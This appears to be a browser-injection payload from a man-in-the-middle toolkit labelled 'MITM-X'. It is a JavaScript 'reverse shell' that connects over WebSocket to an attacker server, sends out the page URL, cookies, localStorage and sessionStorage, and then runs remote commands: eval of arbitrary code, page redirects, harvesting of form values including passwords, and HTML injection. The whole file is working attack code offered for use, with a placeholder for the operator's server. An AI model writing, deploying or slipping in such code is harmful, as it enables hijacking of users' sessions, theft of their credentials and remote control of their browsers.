// Reverse Shell Payload - Establishes WebSocket connection for remote command execution
(function(){
    var attackerServer = 'ws://192.168.1.100:3000'; // Change to your WebSocket server
    var reconnectDelay = 5000;
    var ws = null;
    
    function connect() {
        try {
            ws = new WebSocket(attackerServer + '/shell');
            
            ws.onopen = function() {
                console.log('MITM-X Reverse shell connected');
                
                // Send initial information
                ws.send(JSON.stringify({
                    type: 'init',
                    data: {
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        cookies: document.cookie,
                        localStorage: getLocalStorage(),
                        sessionStorage: getSessionStorage(),
                        timestamp: new Date().toISOString()
                    }
                }));
            };
            
            ws.onmessage = function(event) {
                try {
                    var cmd = JSON.parse(event.data);
                    executeCommand(cmd);
                } catch(e) {
                    sendResponse('error', 'Failed to parse command: ' + e.message);
                }
            };
            
            ws.onclose = function() {
                console.log('MITM-X Reverse shell disconnected, reconnecting...');
                setTimeout(connect, reconnectDelay);
            };
            
            ws.onerror = function(error) {
                console.log('MITM-X Reverse shell error:', error);
            };
            
        } catch(e) {
            console.log('MITM-X Reverse shell connection failed:', e);
            setTimeout(connect, reconnectDelay);
        }
    }
    
    function executeCommand(cmd) {
        var result;
        
        try {
            switch(cmd.type) {
                case 'eval':
                    result = eval(cmd.payload);
                    sendResponse('success', result, cmd.id);
                    break;
                    
                case 'screenshot':
                    takeScreenshot(cmd.id);
                    break;
                    
                case 'redirect':
                    window.location.href = cmd.payload;
                    sendResponse('success', 'Redirecting to ' + cmd.payload, cmd.id);
                    break;
                    
                case 'steal_forms':
                    result = stealFormData();
                    sendResponse('success', result, cmd.id);
                    break;
                    
                case 'inject_html':
                    injectHTML(cmd.payload);
                    sendResponse('success', 'HTML injected', cmd.id);
                    break;
                    
                case 'get_cookies':
                    result = {
                        cookies: document.cookie,
                        localStorage: getLocalStorage(),
                        sessionStorage: getSessionStorage()
                    };
                    sendResponse('success', result, cmd.id);
                    break;
                    
                default:
                    sendResponse('error', 'Unknown command type: ' + cmd.type, cmd.id);
            }
        } catch(e) {
            sendResponse('error', e.toString(), cmd.id);
        }
    }
    
    function sendResponse(status, data, id) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: 'response',
                status: status,
                data: data,
                id: id,
                timestamp: new Date().toISOString()
            }));
        }
    }
    
    function getLocalStorage() {
        var data = {};
        try {
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        return data;
    }
    
    function getSessionStorage() {
        var data = {};
        try {
            for (var i = 0; i < sessionStorage.length; i++) {
                var key = sessionStorage.key(i);
                data[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        return data;
    }
    
    function stealFormData() {
        var forms = document.getElementsByTagName('form');
        var formData = [];
        
        for (var i = 0; i < forms.length; i++) {
            var form = forms[i];
            var inputs = form.getElementsByTagName('input');
            var formInfo = {
                action: form.action,
                method: form.method,
                fields: []
            };
            
            for (var j = 0; j < inputs.length; j++) {
                var input = inputs[j];
                formInfo.fields.push({
                    name: input.name,
                    type: input.type,
                    value: input.value,
                    placeholder: input.placeholder
                });
            }
            
            formData.push(formInfo);
        }
        
        return formData;
    }
    
    function injectHTML(html) {
        var div = document.createElement('div');
        div.innerHTML = html;
        document.body.appendChild(div);
    }
    
    function takeScreenshot(id) {
        // This would require additional libraries, sending placeholder
        sendResponse('info', 'Screenshot functionality requires additional setup', id);
    }
    
    // Start connection
    connect();
    
    console.log('MITM-X Reverse shell payload loaded');
})();
